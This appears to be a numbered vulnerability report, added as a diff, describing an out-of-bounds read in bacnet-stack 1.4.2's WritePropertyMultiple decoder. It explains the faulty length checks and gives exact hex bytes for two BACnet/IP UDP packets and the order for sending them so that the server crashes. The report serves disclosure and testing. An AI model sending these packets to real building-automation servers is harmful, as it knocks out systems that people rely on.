@@ -1,0 +1,15 @@
+Number: 1304
+
+Summarize:
+In bacnet-stack 1.4.2, a crafted BACnet/IP WritePropertyMultiple packet sequence can trigger an out-of-bounds read in the decode path. The report says wpm_decode_object_property(), while parsing the optional priority field (tag 3), trusts len_value and calls decode_unsigned() even when it exceeds the bytes remaining in the current sub-buffer (example given: len_value 4 with only 3 bytes left), so it can return a length larger than its apdu_len; write_property_multiple_decode() then adds that length to its offset without checking that it still fits in the remaining input, underflowing the later length calculation and propagating invalid state into bacnet_enclosed_data_length()/bacnet_tag_decode(). The observed result is an AddressSanitizer global-buffer-overflow read in bacnet_tag_number_decode() and a crash from reading past the receive buffer; the reporter additionally says this appears to be a remotely reachable denial of service.
+
+Reproduce:
+Use the unmodified server-side code path in bacnet-stack 1.4.2 that handles WritePropertyMultiple. Send these BACnet/IP UDP packets in order:
+1. <81><0b><00><19><01><20><ff><ff><00><ff><10><00><c4><02><00><03><e8><22><05><c4><91><03><22><01><04>
+2. <81><0a><30><30><01><04><00><00><30><10><00><0d><40><30><30><1e><03><00><01><9e><2e><30><30><2f><3c><01><30><2e>
+3. Repeat packet 1.
+4. Repeat packet 2.
+Expected result: the WritePropertyMultiple decode path reads past the end of the receive buffer and the server crashes. In the reporter's tests, AddressSanitizer reported "ERROR: AddressSanitizer: global-buffer-overflow" and "READ of size 1", with the fault in bacnet_tag_number_decode().
+
+Payload:
+81 0a 30 30 01 04 00 00 30 10 00 0d 40 30 30 1e 03 00 01 9e 2e 30 30 2f 3c 01 30 2e
